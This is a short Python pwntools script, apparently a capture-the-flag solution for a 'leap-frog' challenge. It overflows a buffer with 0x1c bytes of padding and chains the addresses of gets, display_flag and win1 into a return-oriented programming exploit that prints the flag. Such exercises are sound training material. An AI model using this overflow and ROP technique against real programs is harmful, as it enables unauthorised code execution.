...
binary = '/problems/leap-frog_5_d75e27ca262f95ef1168d21a5cee638d/rop'
libc = None
host = None
port = None
...
if __name__ == '__main__':
    ...
    rop = 'A' * 0x1c + ''.join(map(pwn.p32, [BIN.plt['gets'], BIN.sym['display_flag'], BIN.sym['win1']]))
    T.sendlineafter('input>', rop)
    T.sendline('A'*3)

    print 'Flag: ' + T.recvall().strip()
